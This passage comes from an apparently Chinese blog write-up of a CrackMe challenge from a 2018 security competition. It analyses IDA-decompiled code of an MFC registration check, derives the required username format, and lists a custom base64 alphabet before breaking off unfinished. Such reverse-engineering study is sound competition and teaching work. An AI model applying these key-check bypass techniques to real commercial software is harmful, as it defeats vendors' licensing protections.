href="https://bbs.pediy.com/thread-170033.htm">神器链接</a>。</p><p>如果不使用上面的神器的话，此程序是一个MFC程序，获取输入框的方式有两种<code>GetDlgItem</code>和<code>GetWindowText</code>，查看这两个函数的调用，发现在<code>sub_4026F0</code>中有多处对<code>GetDlgItem</code>的调用，因此分析这个函数，IDA对此函数生成的主要伪C代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __thiscall <span class="hljs-title function_">sub_4026F0</span><span class="hljs-params">(HWND *this)</span><br>&#123;<br>  ......<br>      <br>  v21 = (CWnd *)this;<br>  v1 = GetDlgItem(this[<span class="hljs-number">8</span>], <span class="hljs-number">1000</span>);<br>  <span class="hljs-built_in">memset</span>(&amp;lParam, <span class="hljs-number">0</span>, <span class="hljs-number">0x400</span>u);<br>  SendMessageA(v1, <span class="hljs-number">0xD</span>u, <span class="hljs-number">0x400</span>u, (LPARAM)&amp;lParam);<br>  v2 = GetDlgItem(*((HWND *)v21 + <span class="hljs-number">8</span>), <span class="hljs-number">1001</span>);<br>  <span class="hljs-built_in">memset</span>(&amp;v23, <span class="hljs-number">0</span>, <span class="hljs-number">0x400</span>u);<br>  SendMessageA(v2, <span class="hljs-number">0xD</span>u, <span class="hljs-number">0x400</span>u, (LPARAM)&amp;v23);<br>  v3 = v21;<br>  v4 = CWnd::GetDlgItem(v21, <span class="hljs-number">1004</span>);<br>  v20 = SendMessageW(*((HWND *)v4 + <span class="hljs-number">8</span>), <span class="hljs-number">0xF0</span>u, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) == <span class="hljs-number">1</span>;<br>  v21 = (CWnd *)&amp;v14;<br>  v19 = <span class="hljs-number">15</span>;<br>  v18 = <span class="hljs-number">0</span>;<br>  LOBYTE(v14) = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">if</span> ( (_BYTE)v23 )<br>    v5 = <span class="hljs-built_in">strlen</span>((<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)&amp;v23);<br>  <span class="hljs-keyword">else</span><br>    v5 = <span class="hljs-number">0</span>;<br>  sub_402A70(&amp;v14, &amp;v23, v5);<br>  v49 = <span class="hljs-number">0</span>;<br>  v13 = <span class="hljs-number">15</span>;<br>  v12 = <span class="hljs-number">0</span>;<br>  v8 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">if</span> ( (_BYTE)lParam )<br>    v6 = <span class="hljs-built_in">strlen</span>((<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)&amp;lParam);<br>  <span class="hljs-keyword">else</span><br>    v6 = <span class="hljs-number">0</span>;<br>  sub_402A70(&amp;v8, &amp;lParam, v6);<br>  v49 = <span class="hljs-number">-1</span>;<br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int8)sub_405510(*(LPVOID *)&amp;v8, v9, v10, v11, v12, v13, v14, v15, v16, v17, v18, v19, v20) )<br>  &#123;<br>    v24 = <span class="hljs-string">&#x27;e\0R&#x27;</span>;<br>    v40 = <span class="hljs-number">0</span>;<br>    v7 = (<span class="hljs-type">wchar_t</span> *)&amp;v24;<br>    v25 = <span class="hljs-string">&#x27;i\0g&#x27;</span>;<br>    v26 = <span class="hljs-string">&#x27;t\0s&#x27;</span>;<br>    v27 = <span class="hljs-string">&#x27;r\0e&#x27;</span>;<br>    v28 = (<span class="hljs-type">int</span>)&amp;loc_53001D + <span class="hljs-number">3</span>;<br>    v29 = <span class="hljs-string">&#x27;c\0u&#x27;</span>;<br>    v30 = <span class="hljs-string">&#x27;e\0c&#x27;</span>;<br>    v31 = <span class="hljs-string">&#x27;s\0s&#x27;</span>;<br>    v32 = &amp;loc_43002C;<br>    v33 = <span class="hljs-string">&#x27;n\0o&#x27;</span>;<br>    v34 = <span class="hljs-string">&#x27;r\0g&#x27;</span>;<br>    v35 = <span class="hljs-string">&#x27;t\0a&#x27;</span>;<br>    v36 = <span class="hljs-string">&#x27;l\0u&#x27;</span>;<br>    v37 = <span class="hljs-string">&#x27;t\0a&#x27;</span>;<br>    v38 = <span class="hljs-string">&#x27;o\0i&#x27;</span>;<br>    v39 = <span class="hljs-string">&#x27;!\0n&#x27;</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    *(_DWORD *)v41 = <span class="hljs-string">&#x27;e\0R&#x27;</span>;<br>    v7 = v41;<br>    v42 = <span class="hljs-string">&#x27;i\0g&#x27;</span>;<br>    v43 = <span class="hljs-string">&#x27;t\0s&#x27;</span>;<br>    v44 = <span class="hljs-string">&#x27;r\0e&#x27;</span>;<br>    v45 = &amp;loc_460020;<br>    v46 = <span class="hljs-string">&#x27;i\0a&#x27;</span>;<br>    v47 = <span class="hljs-string">&#x27;e\0l&#x27;</span>;<br>    v48 = <span class="hljs-string">&#x27;d&#x27;</span>;<br>  &#125;<br>  CWnd::SetDlgItemTextW(v3, <span class="hljs-number">1003</span>, v7);<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看出这是程序的主流程。下面就一步一步分析此函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __thiscall <span class="hljs-title function_">sub_4026F0</span><span class="hljs-params">(HWND *this)</span><br>&#123;<br>  ......<br>      <br>  v21 = (CWnd *)this;<br>  UserName_Text_ID = GetDlgItem(this[<span class="hljs-number">8</span>], <span class="hljs-number">1000</span>);<br>  <span class="hljs-built_in">memset</span>(&amp;UserName, <span class="hljs-number">0</span>, <span class="hljs-number">02000u</span>);<br>  SendMessageA(UserName_Text_ID, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-number">02000u</span>, (LPARAM)&amp;UserName);<span class="hljs-comment">// 存储UserName</span><br>  RegCode_Text_ID = GetDlgItem(*((HWND *)v21 + <span class="hljs-number">8</span>), <span class="hljs-number">1001</span>);<br>  <span class="hljs-built_in">memset</span>(&amp;RegCode, <span class="hljs-number">0</span>, <span class="hljs-number">02000u</span>);<br>  SendMessageA(RegCode_Text_ID, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-number">02000u</span>, (LPARAM)&amp;RegCode);<span class="hljs-comment">// 存储RegCode</span><br>  v3 = v21;<br>  User_Choice = CWnd::GetDlgItem(v21, <span class="hljs-number">1004</span>);<br>  v20 = SendMessageW(*((HWND *)User_Choice + <span class="hljs-number">8</span>), <span class="hljs-number">0xF0</span>u, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) == <span class="hljs-number">1</span>;<span class="hljs-comment">// 判断选择的是标准版还是进阶版</span><br>  v21 = (CWnd *)&amp;v14;<br>  v19 = <span class="hljs-number">15</span>;<br>  v18 = <span class="hljs-number">0</span>;<br>  LOBYTE(v14) = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">if</span> ( (_BYTE)RegCode )<br>    v5 = <span class="hljs-built_in">strlen</span>((<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)&amp;RegCode);        <span class="hljs-comment">// 判断RegCode长度</span><br>  <span class="hljs-keyword">else</span><br>    v5 = <span class="hljs-number">0</span>;<br>  assign_sub_402A70(&amp;v14, &amp;RegCode, v5);        <span class="hljs-comment">// string assign </span><br>                                                <span class="hljs-comment">// 将RegCode的值赋给v14</span><br>  v49 = <span class="hljs-number">0</span>;<br>  v13 = <span class="hljs-number">15</span>;<br>  v12 = <span class="hljs-number">0</span>;<br>  v8 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">if</span> ( (_BYTE)UserName )<br>    v6 = <span class="hljs-built_in">strlen</span>((<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)&amp;UserName);       <span class="hljs-comment">// 判断UserName长度</span><br>  <span class="hljs-keyword">else</span><br>    v6 = <span class="hljs-number">0</span>;<br>  assign_sub_402A70(&amp;v8, &amp;UserName, v6);        <span class="hljs-comment">// string assign </span><br>                                                <span class="hljs-comment">// 将Username的值赋给v8</span><br>  v49 = <span class="hljs-number">-1</span>;<br>  <span class="hljs-keyword">if</span> ( sub_405510(*(LPVOID *)&amp;v8, v9, v10, v11, v12, v13, v14, v15, v16, v17, v18, v19, v20) )<span class="hljs-comment">// 主检验函数</span><br>  &#123;<br>    v24 = <span class="hljs-string">&#x27;e\0R&#x27;</span>;<br>    v40 = <span class="hljs-number">0</span>;<br>    v7 = (<span class="hljs-type">wchar_t</span> *)&amp;v24;<br>    v25 = <span class="hljs-string">&#x27;i\0g&#x27;</span>;<br>    v26 = <span class="hljs-string">&#x27;t\0s&#x27;</span>;<br>    v27 = <span class="hljs-string">&#x27;r\0e&#x27;</span>;<br>    v28 = (<span class="hljs-type">int</span>)&amp;loc_53001D + <span class="hljs-number">3</span>;<br>    v29 = <span class="hljs-string">&#x27;c\0u&#x27;</span>;<br>    v30 = <span class="hljs-string">&#x27;e\0c&#x27;</span>;                               <span class="hljs-comment">// RegisterSuccess,Congratulation!</span><br>    v31 = <span class="hljs-string">&#x27;s\0s&#x27;</span>;<br>    v32 = &amp;loc_43002C;<br>    v33 = <span class="hljs-string">&#x27;n\0o&#x27;</span>;<br>    v34 = <span class="hljs-string">&#x27;r\0g&#x27;</span>;<br>    v35 = <span class="hljs-string">&#x27;t\0a&#x27;</span>;<br>    v36 = <span class="hljs-string">&#x27;l\0u&#x27;</span>;<br>    v37 = <span class="hljs-string">&#x27;t\0a&#x27;</span>;<br>    v38 = <span class="hljs-string">&#x27;o\0i&#x27;</span>;<br>    v39 = <span class="hljs-string">&#x27;!\0n&#x27;</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    *(_DWORD *)v41 = <span class="hljs-string">&#x27;e\0R&#x27;</span>;<br>    v7 = v41;<br>    v42 = <span class="hljs-string">&#x27;i\0g&#x27;</span>;<br>    v43 = <span class="hljs-string">&#x27;t\0s&#x27;</span>;<br>    v44 = <span class="hljs-string">&#x27;r\0e&#x27;</span>;                               <span class="hljs-comment">// RegisterFailed</span><br>    v45 = &amp;loc_460020;<br>    v46 = <span class="hljs-string">&#x27;i\0a&#x27;</span>;<br>    v47 = <span class="hljs-string">&#x27;e\0l&#x27;</span>;<br>    v48 = <span class="hljs-string">&#x27;d&#x27;</span>;<br>  &#125;<br>  CWnd::SetDlgItemTextW(v3, <span class="hljs-number">1003</span>, v7);<br>&#125;<br></code></pre></td></tr></table></figure><p>以上步骤完成了基本的数据获取、校验操作，其中有一个主要的校验函数<code>sub_405510</code>，下面来重点分析这个函数：</p><p><img src="https://i.loli.net/2019/03/08/5c8140c51a4f1.png"></p><p>当返回值<code>v13</code>为<code>True</code>时才能注册成功，因此我们需要关注使<code>v13</code>为<code>True</code>的函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( sub_404F00((<span class="hljs-type">int</span> *)&amp;UserName) )<br>  &#123;<br>    sub_405040((<span class="hljs-type">int</span>)&amp;UserName, &amp;v26, &amp;v27, &amp;v28, (<span class="hljs-type">int</span> *)&amp;v29, &amp;v30);<br>    v31 = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>    v32 = <span class="hljs-number">0</span>;<br>    LOBYTE(v34) = <span class="hljs-number">2</span>;<br>    v14 = &amp;a7;<br>    <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)a12 &gt;= <span class="hljs-number">0x10</span> )<br>      v14 = a7;<br>    <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int8)sub_406080(v14, &amp;v31)<br>      &amp;&amp; ((v16 = HIDWORD(v31), v17 = (__m128i *)v31, a13)<br>       || (v33 = xmmword_5AC470, (<span class="hljs-type">unsigned</span> __int8)sub_403010(&amp;v33, v15, v31)))<br>      &amp;&amp; v16 - (_DWORD)v17 == <span class="hljs-number">32</span><br>      &amp;&amp; v17[<span class="hljs-number">1</span>].m128i_i32[<span class="hljs-number">2</span>] == <span class="hljs-string">&#x27;2018&#x27;</span><br>      &amp;&amp; !v17[<span class="hljs-number">1</span>].m128i_i32[<span class="hljs-number">3</span>] )<br>    &#123;<br>      v18 = *v17;<br>      *((_QWORD *)&amp;v33 + <span class="hljs-number">1</span>) = v17[<span class="hljs-number">1</span>].m128i_i64[<span class="hljs-number">0</span>];<br>      v13 = sub_402F20(<br>              v26,<br>              v27,<br>              v28,<br>              v29,<br>              v30,<br>              __PAIR__(_mm_cvtsi128_si32(_mm_srli_si128(v18, <span class="hljs-number">4</span>)), _mm_cvtsi128_si32(v18)),<br>              __PAIR__(_mm_cvtsi128_si32(_mm_srli_si128(v18, <span class="hljs-number">12</span>)), _mm_cvtsi128_si32(_mm_srli_si128(v18, <span class="hljs-number">8</span>))),<br>              *((__int64 *)&amp;v33 + <span class="hljs-number">1</span>));<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      v13 = <span class="hljs-number">0</span>;<br>    &#125;<br>    sub_405740(&amp;v31);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    v13 = <span class="hljs-number">0</span>;<br>  &#125;<br></code></pre></td></tr></table></figure><p>首先我们查看 <code>sub_404F00</code>函数，同样按照逆向思维，寻找使返回值为True的条件。此函数中有如下几个关键片段：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c">v1 = UserName;<br><span class="hljs-keyword">if</span> ( UserName[<span class="hljs-number">4</span>] != <span class="hljs-number">39</span> )                      <span class="hljs-comment">// 判断UserName的长度是否为39</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>v3 = UserName[<span class="hljs-number">5</span>];<br><span class="hljs-keyword">if</span> ( v3 &lt; <span class="hljs-number">020</span> )<br>  v23 = UserName;<br><span class="hljs-keyword">else</span><br>  v23 = (<span class="hljs-type">int</span> *)*UserName;<br><span class="hljs-keyword">if</span> ( v3 &lt; <span class="hljs-number">020</span> )<br>  v4 = UserName;<br><span class="hljs-keyword">else</span><br>  v4 = (<span class="hljs-type">int</span> *)*UserName;                      <span class="hljs-comment">// String的相关函数，用于决定字符串的存储位置等</span><br>v5 = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v4 + <span class="hljs-number">39</span>;<br><span class="hljs-keyword">if</span> ( v3 &lt; <span class="hljs-number">0x10</span> )<br>  v6 = UserName;<br><span class="hljs-keyword">else</span><br>  v6 = (<span class="hljs-type">int</span> *)*UserName;<br>v7 = v5 - (_DWORD)v6;<br>i = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v6 &gt; v5 )<br>  v7 = <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure><p>将<code>UserName</code>中的小写字母转换为大写：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( v7 )<br>  &#123;<br>    Username_len = v7;<br>    <span class="hljs-keyword">do</span><br>    &#123;<br>      *((_BYTE *)v23 + i) = <span class="hljs-built_in">toupper</span>(*((<span class="hljs-type">char</span> *)v6 + i));<span class="hljs-comment">// 将小写字母转换为大写字母</span><br>      ++i;<br>    &#125;<br>    <span class="hljs-keyword">while</span> ( i != Username_len );<br>    v1 = UserName;<br>  &#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c">v16 = <span class="hljs-number">0</span>;                                      <span class="hljs-comment">// v16为一个字符串</span><br>  assign_sub_402A70(&amp;v16, &amp;unk_5AC430, <span class="hljs-string">&#x27;\x01&#x27;</span>); <span class="hljs-comment">// 给v16赋值为&#x27;#&#x27;</span><br>  sub_404D70((<span class="hljs-type">int</span>)v24, (<span class="hljs-type">int</span>)UserName_Upper, *(LPVOID *)&amp;v16, v17, v18, v19, v20, v21);<span class="hljs-comment">// 将大写的UserName用#分割，分割后的结果保存在v24中</span><br>  v10 = (_DWORD *)v24[<span class="hljs-number">0</span>];<br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)(v24[<span class="hljs-number">1</span>] - v24[<span class="hljs-number">0</span>] - <span class="hljs-number">192</span>) &gt;= <span class="hljs-number">24</span> )<br>    <span class="hljs-keyword">goto</span> LABEL_30;<br>  <span class="hljs-keyword">if</span> ( v24[<span class="hljs-number">0</span>] != v24[<span class="hljs-number">1</span>] )<br>  &#123;<br>    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>    &#123;<br>      v11 = v10[<span class="hljs-number">4</span>];<br>      v12 = <span class="hljs-number">0</span>;<br>      <span class="hljs-keyword">if</span> ( v11 &gt; <span class="hljs-number">0</span> )<br>        <span class="hljs-keyword">break</span>;<br>LABEL_28:<br>      v10 += <span class="hljs-number">6</span>;<br>      <span class="hljs-keyword">if</span> ( v10 == (_DWORD *)v24[<span class="hljs-number">1</span>] )            <span class="hljs-comment">// 字符串验证成功</span><br>        <span class="hljs-keyword">goto</span> LABEL_29;<br>    &#125;<br>    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>    &#123;<br>      v13 = v10[<span class="hljs-number">5</span>] &lt; <span class="hljs-number">0x10</span>u ? v10 : *v10;<br>      v14 = *((_BYTE *)v13 + v12);<br>      <span class="hljs-keyword">if</span> ( (v14 &gt; <span class="hljs-number">57</span> || v14 &lt; <span class="hljs-number">48</span>) &amp;&amp; (<span class="hljs-type">unsigned</span> __int8)(v14 - <span class="hljs-string">&#x27;A&#x27;</span>) &gt; <span class="hljs-number">5u</span> )<span class="hljs-comment">// 要求Username的范围为数字和ABCDEF</span><br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">if</span> ( ++v12 &gt;= v11 )<br>        <span class="hljs-keyword">goto</span> LABEL_28;<br>    &#125;<br>LABEL_30:<br>    v15 = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">goto</span> LABEL_31;<br>  &#125;<br>LABEL_29:<br>  v15 = <span class="hljs-number">1</span>;<br>LABEL_31:<br>  sub_405A00((<span class="hljs-type">char</span> **)v24);<br>  <span class="hljs-keyword">return</span> v15;<br>&#125;<br></code></pre></td></tr></table></figure><p>分析到这里我们可以得出关于<code>UserName</code>的几个信息：</p><ul><li><code>UserName</code>的长度必须为<code>39</code></li><li>存放UserName的数组的元素个数为8</li><li><code>UserName</code>会被<code>#</code>分割</li><li><code>UserName</code>由数字和<code>ABCDEF</code>组成</li></ul><p>因此可以得知<code>UserName</code>的形式为：</p><p><code>xxxx#xxxx#xxxx#xxxx#xxxx#xxxx#xxxx#xxxx</code></p><p>base64：<code>YtTJUVEn0$HI34y#8rsFewxlm+/u5a^2welcomegslab2018zQfghDRSG@di*kABZO6Kq79L&amp;CPWvNop</code></p><h3 id="未完待续…-…-📐"><a href="#未完待续…-…-📐" class="headerlink" title="未完待续… … 📐"></a>未完待续… … 📐</h3>]]></content>
    
    
    <categories>
      
      <category>二进制安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CrackMe</tag>
      
      <tag>游戏安全</tag>
      
      <tag>二进制安全</tag>
      
      <tag>安全竞赛</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
